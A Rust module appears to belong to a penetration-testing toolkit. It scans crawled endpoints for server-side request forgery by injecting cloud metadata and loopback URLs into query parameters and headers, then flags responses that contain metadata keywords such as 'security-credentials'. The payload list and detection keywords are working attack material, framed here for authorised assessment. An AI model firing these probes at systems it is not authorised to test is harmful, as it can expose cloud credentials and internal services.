/*******************************************************************
 * Filename:        ssrf.rs
 * Author:          Jeff
 * Date:            2026-05-17
 * Description:     mg-ssrf — SSRF detection via crawl corpus injection and
 *                  cloud metadata endpoint probing with OOB correlation.
 * Notes:           Injectable points sourced from crawl/endpoints.json
 *                  (EndpointMatch shape) or recon/summary.json root paths.
 *                  OOB correlation checks oob/callbacks-*.json for token hits.
 *                  Concurrency bounded with tokio::JoinSet; drained at ceiling.
 *******************************************************************/

use std::collections::HashSet;
use std::fs;
use std::path::Path;
use std::time::Duration;

use anyhow::{Context, Result};
use clap::Parser;
use reqwest::header::HeaderMap;
use serde::{Deserialize, Serialize};
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use tokio::task::JoinSet;

use engagement::{Engagement, FindingSeverity, ToolFinding, write_finding};

// ── Constants ────────────────────────────────────────────────────────────────

const OUTPUT_SUBDIR: &str = "ssrf";
const OUTPUT_FILE_PREFIX: &str = "results-";
const AUDIT_TOOL: &str = "mg-ssrf";

// Cloud metadata payloads probed for each injectable point
const SSRF_PAYLOADS: &[&str] = &[
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://100.100.100.200/latest/meta-data/",
    "http://127.0.0.1/",
    "http://[::1]/",
];

// Keywords that indicate cloud metadata content in a response body
const METADATA_KEYWORDS: &[&str] = &[
    "ami-id",
    "instance-id",
    "computeMetadata",
    "imdsv2",
    "instanceId",
    "local-ipv4",
    "security-credentials",
];

// Headers injected as injectable points in addition to query params
const INJECTABLE_HEADERS: &[&str] = &["X-Forwarded-For", "X-Real-IP", "Referer", "Host"];

// ── CLI ──────────────────────────────────────────────────────────────────────

#[derive(Parser, Debug)]
pub struct Args {
    /// Engagement name
    engagement: String,

    /// Engagements root directory
    #[arg(long, env = "MG_ENGAGEMENTS_DIR", default_value = "engagements")]
    engagements_dir: String,

    /// Maximum concurrent probes
    #[arg(long, default_value_t = 10)]
    concurrency: usize,

    /// HTTP timeout in seconds
    #[arg(long, default_value_t = 15)]
    timeout: u64,

    /// OOB callback URL for blind SSRF (e.g. from mg-oob)
    #[arg(long)]
    oob_url: Option<String>,
}

// ── Data types ───────────────────────────────────────────────────────────────

// One injectable point (url + param name + injection location)
#[derive(Debug, Clone)]
struct InjectablePoint {
    base_url: String,
    param_name: String,
    inject_kind: InjectKind,
}

#[derive(Debug, Clone)]
enum InjectKind {
    QueryParam,
    Header,
}

// Result of probing one payload at one injectable point
#[derive(Debug, Serialize)]
struct ProbeResult {
    url: String,
    param: String,
    payload: String,
    status: u16,
    body_preview: String,
    verdict: Verdict,
}

#[derive(Debug, Serialize, PartialEq, Eq)]
enum Verdict {
    Confirmed,
    Potential,
    Miss,
}

// Top-level output written to disk
#[derive(Serialize)]
struct SsrfResults {
    engagement: String,
    timestamp: String,
    total_probes: usize,
    confirmed: usize,
    potential: usize,
    results: Vec<ProbeResult>,
}

// Mirrors the EndpointMatch shape written by mg-crawl
#[derive(Deserialize)]
struct EndpointMatch {
    path: String,
    #[serde(default)]
    params: Vec<String>,
    #[serde(default = "default_method")]
    method: String,
}

// Mirrors the HostRecord shape from recon/summary.json
#[derive(Deserialize)]
struct HostRecord {
    hostname: String,
    http_accessible: bool,
    #[serde(default)]
    open_ports: Vec<u16>,
}

#[derive(Deserialize)]
struct ReconSummary {
    hosts: Vec<HostRecord>,
}

// ── Helpers ───────────────────────────────────────────────────────────────────

// Return default HTTP method for deserialization
fn default_method() -> String {
    "GET".to_string()
}

// Build base URL from a recon host record
fn base_url_for_host(rec: &HostRecord) -> String {
    if rec.open_ports.contains(&443) {
        return format!("https://{}", rec.hostname);
    }
    if rec.open_ports.contains(&80) {
        return format!("http://{}", rec.hostname);
    }
    format!("https://{}", rec.hostname)
}

// Collect injectable points from crawl endpoints.json files under crawl/
fn collect_from_crawl(crawl_dir: &Path) -> Vec<InjectablePoint> {
    let mut points = Vec::new();
    let Ok(hosts) = fs::read_dir(crawl_dir) else {
        return points;
    };
    for entry in hosts.flatten() {
        if !entry.file_type().map(|t| t.is_dir()).unwrap_or(false) {
            continue;
        }
        let endpoints_path = entry.path().join("endpoints.json");
        let Ok(raw) = fs::read_to_string(&endpoints_path) else {
            continue;
        };
        let Ok(endpoints): Result<Vec<EndpointMatch>, _> = serde_json::from_str(&raw) else {
            continue;
        };
        for ep in endpoints {
            // Only GET and POST are meaningful injection vectors
            if ep.method != "GET" && ep.method != "POST" {
                continue;
            }
            for param in &ep.params {
                // Build the base URL without the query string for injection
                let base = ep.path.split('?').next().unwrap_or(&ep.path).to_string();
                points.push(InjectablePoint {
                    base_url: base,
                    param_name: param.clone(),
                    inject_kind: InjectKind::QueryParam,
                });
            }
            // Always inject common headers regardless of params
            for hdr in INJECTABLE_HEADERS {
                points.push(InjectablePoint {
                    base_url: ep.path.split('?').next().unwrap_or(&ep.path).to_string(),
                    param_name: hdr.to_string(),
                    inject_kind: InjectKind::Header,
                });
            }
        }
    }
    points
}

// Collect injectable points from recon summary (root path per accessible host)
fn collect_from_recon(recon_dir: &Path) -> Vec<InjectablePoint> {
    let summary_path = recon_dir.join("summary.json");
    let Ok(raw) = fs::read_to_string(&summary_path) else {
        return Vec::new();
    };
    let Ok(summary): Result<ReconSummary, _> = serde_json::from_str(&raw) else {
        return Vec::new();
    };
    let mut points = Vec::new();
    for host in &summary.hosts {
        if !host.http_accessible {
            continue;
        }
        let base = base_url_for_host(host);
        for hdr in INJECTABLE_HEADERS {
            points.push(InjectablePoint {
                base_url: base.clone(),
                param_name: hdr.to_string(),
                inject_kind: InjectKind::Header,
            });
        }
    }
    points
}

// Check whether response body contains cloud metadata keywords
fn body_has_metadata(body: &str) -> bool {
    METADATA_KEYWORDS.iter().any(|kw| body.contains(kw))
}

// Probe one injectable point with one payload, return a ProbeResult
async fn probe(client: reqwest::Client, point: InjectablePoint, payload: String) -> ProbeResult {
    let result = match point.inject_kind {
        InjectKind::QueryParam => {
            let url = if point.base_url.contains('?') {
                format!(
                    "{}&{}={}",
                    point.base_url,
                    point.param_name,
                    urlencoding_simple(&payload)
                )
            } else {
                format!(
                    "{}?{}={}",
                    point.base_url,
                    point.param_name,
                    urlencoding_simple(&payload)
                )
            };
            client.get(&url).send().await
        }
        InjectKind::Header => {
            client
                .get(&point.base_url)
                .header(&point.param_name, &payload)
                .send()
                .await
        }
    };

    match result {
        Ok(resp) => {
            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();
            let body_preview: String = body.chars().take(512).collect();
            let verdict = if body_has_metadata(&body) {
                Verdict::Confirmed
            } else if status == 200 && !body.is_empty() {
                Verdict::Potential
            } else {
                Verdict::Miss
            };
            ProbeResult {
                url: point.base_url,
                param: point.param_name,
                payload,
                status,
                body_preview,
                verdict,
            }
        }
        Err(_) => ProbeResult {
            url: point.base_url,
            param: point.param_name,
            payload,
            status: 0,
            body_preview: String::new(),
            verdict: Verdict::Miss,
        },
    }
}

// Minimal percent-encoding for payload values in query strings (encode space and &)
fn urlencoding_simple(s: &str) -> String {
    s.chars()
        .flat_map(|c| match c {
            ' ' => vec!['%', '2', '0'],
            '&' => vec!['%', '2', '6'],
            '#' => vec!['%', '2', '3'],
            _ => vec![c],
        })
        .collect()
}

// Read OOB callbacks files and return the set of token strings that hit
fn load_oob_hits(oob_dir: &Path) -> HashSet<String> {
    let mut hits = HashSet::new();
    let Ok(entries) = fs::read_dir(oob_dir) else {
        return hits;
    };
    for entry in entries.flatten() {
        let name = entry.file_name();
        let name_str = name.to_string_lossy();
        if !name_str.starts_with("callbacks-") || !name_str.ends_with(".json") {
            continue;
        }
        let Ok(raw) = fs::read_to_string(entry.path()) else {
            continue;
        };
        let Ok(val): Result<serde_json::Value, _> = serde_json::from_str(&raw) else {
            continue;
        };
        // auto_token field is the generated listener token
        if let Some(token) = val.get("auto_token").and_then(|t| t.as_str())
            && val.get("hits").and_then(|h| h.as_u64()).unwrap_or(0) > 0
        {
            hits.insert(token.to_string());
        }
    }
    hits
}

// ── Entry point ───────────────────────────────────────────────────────────────

pub async fn run(args: Args) -> Result<()> {
    let eng = Engagement::load_named(Path::new(&args.engagements_dir), &args.engagement)
        .with_context(|| format!("load engagement {}", args.engagement))?;

    // Build the effective payload list (static + optional OOB URL)
    let mut payloads: Vec<String> = SSRF_PAYLOADS.iter().map(|s| s.to_string()).collect();
    if let Some(oob) = &args.oob_url {
        payloads.push(oob.clone());
    }

    // Load OOB hits for correlation
    let oob_dir = eng.root.join("oob");
    let oob_hits = if oob_dir.exists() {
        load_oob_hits(&oob_dir)
    } else {
        HashSet::new()
    };

    // Collect injectable points from crawl output, fall back to recon
    let crawl_dir = eng.crawl_dir();
    let mut points = collect_from_crawl(&crawl_dir);
    if points.is_empty() {
        eprintln!("mg-ssrf: no crawl data found — falling back to recon/summary.json root paths");
        points = collect_from_recon(&eng.recon_dir());
    }
    eprintln!(
        "mg-ssrf: {} injectable points × {} payloads = {} probes",
        points.len(),
        payloads.len(),
        points.len() * payloads.len()
    );

    // Build auth headers from session config
    let auth_headers: HeaderMap = session::get_auth_headers(&eng)
        .await
        .context("load session auth headers")?;

    // Build reqwest client with timeout and auth headers
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(args.timeout))
        .default_headers(auth_headers)
        .danger_accept_invalid_certs(true)
        .build()
        .context("build HTTP client")?;

    // Probe all injectable points with all payloads, bounded concurrency
    let mut join_set: JoinSet<ProbeResult> = JoinSet::new();
    let mut all_results: Vec<ProbeResult> = Vec::new();

    for point in points {
        for payload in &payloads {
            // Drain JoinSet when at concurrency ceiling
            if join_set.len() >= args.concurrency
                && let Some(Ok(r)) = join_set.join_next().await
            {
                all_results.push(r);
            }
            join_set.spawn(probe(client.clone(), point.clone(), payload.clone()));
        }
    }
    // Drain remaining tasks
    while let Some(Ok(r)) = join_set.join_next().await {
        all_results.push(r);
    }

    // OOB correlation: mark results whose payload URL contains an OOB token as confirmed
    if !oob_hits.is_empty() {
        for r in &mut all_results {
            if oob_hits.iter().any(|tok| r.payload.contains(tok.as_str())) {
                r.verdict = Verdict::Confirmed;
            }
        }
    }

    // Print summary to stdout
    let confirmed_count = all_results
        .iter()
        .filter(|r| r.verdict == Verdict::Confirmed)
        .count();
    let potential_count = all_results
        .iter()
        .filter(|r| r.verdict == Verdict::Potential)
        .count();

    println!("\n=== SSRF Findings ===");
    for r in all_results.iter().filter(|r| r.verdict != Verdict::Miss) {
        println!(
            "[{:?}] {} param={} payload={}",
            r.verdict, r.url, r.param, r.payload
        );
    }
    println!("Confirmed: {confirmed_count}  Potential: {potential_count}");

    // Write results JSON
    let ssrf_dir = eng.root.join(OUTPUT_SUBDIR);
    fs::create_dir_all(&ssrf_dir).context("create ssrf output dir")?;
    let ts = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let ts_file = ts.replace(':', "-").replace('+', "Z");
    let out_path = ssrf_dir.join(format!("{OUTPUT_FILE_PREFIX}{ts_file}.json"));

    let results = SsrfResults {
        engagement: args.engagement.clone(),
        timestamp: ts,
        total_probes: all_results.len(),
        confirmed: confirmed_count,
        potential: potential_count,
        results: all_results,
    };
    let json = serde_json::to_string_pretty(&results)?;
    fs::write(&out_path, &json).context("write results JSON")?;
    println!("[*] Results written to {}", out_path.display());

    // Write finding for each confirmed SSRF hit
    for r in results
        .results
        .iter()
        .filter(|r| r.verdict == Verdict::Confirmed)
    {
        let tf = ToolFinding::new(
            "mg-ssrf",
            "Server-Side Request Forgery (SSRF)",
            FindingSeverity::High,
        )
        .url(r.url.clone())
        .parameter(r.param.clone())
        .evidence(format!(
            "payload={} status={} body_preview={}",
            r.payload, r.status, r.body_preview
        ))
        .recommendation(
            "Restrict outbound requests to an allowlist; enforce IMDS v2 on cloud instances",
        );
        let _ = write_finding(&eng, &tf);
    }

    // Audit log
    let detail = format!("confirmed={confirmed_count} potential={potential_count}");
    let _ = eng.audit(AUDIT_TOOL, &eng.meta.target, Some(&detail));

    Ok(())
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn body_has_metadata_detects_aws_keyword() {
        assert!(body_has_metadata("some text ami-id: ami-12345 more text"));
        assert!(body_has_metadata("x instance-id y"));
        assert!(!body_has_metadata("totally normal body"));
    }

    #[test]
    fn urlencoding_simple_encodes_special_chars() {
        assert_eq!(urlencoding_simple("a b"), "a%20b");
        assert_eq!(urlencoding_simple("a&b"), "a%26b");
        assert_eq!(urlencoding_simple("normal"), "normal");
    }

    #[test]
    fn collect_from_crawl_returns_empty_for_missing_dir() {
        let points = collect_from_crawl(Path::new("/nonexistent/crawl/dir"));
        assert!(points.is_empty());
    }

    #[test]
    fn collect_from_recon_returns_empty_for_missing_summary() {
        let points = collect_from_recon(Path::new("/nonexistent/recon/dir"));
        assert!(points.is_empty());
    }

    #[test]
    fn collect_from_crawl_parses_endpoints_json() {
        let tmp = tempfile::tempdir().unwrap();
        let host_dir = tmp.path().join("example.com");
        fs::create_dir_all(&host_dir).unwrap();
        let endpoints = serde_json::json!([
            {"path": "/api/fetch?url=x", "params": ["url"], "method": "GET", "source": "js", "source_url": "https://example.com"}
        ]);
        fs::write(
            host_dir.join("endpoints.json"),
            serde_json::to_string(&endpoints).unwrap(),
        )
        .unwrap();
        let points = collect_from_crawl(tmp.path());
        // url param + INJECTABLE_HEADERS
        assert!(points.len() > 1);
        let param_names: Vec<&str> = points.iter().map(|p| p.param_name.as_str()).collect();
        assert!(param_names.contains(&"url"));
        assert!(param_names.contains(&"X-Forwarded-For"));
    }
}
